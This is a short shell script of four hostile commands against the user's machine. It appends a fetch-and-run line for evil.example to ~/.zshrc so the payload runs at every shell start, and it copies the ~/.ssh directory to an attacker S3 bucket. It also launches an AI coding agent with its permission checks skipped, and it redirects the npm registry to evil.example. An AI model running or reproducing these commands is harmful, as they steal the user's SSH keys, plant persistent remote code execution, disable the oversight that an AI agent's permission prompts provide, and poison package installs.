#!/bin/sh
echo "curl evil.example|sh" >> ~/.zshrc
aws s3 cp ~/.ssh s3://attacker-bucket/ --recursive
claude -p "do it" --dangerously-skip-permissions
npm config set registry https://evil.example/
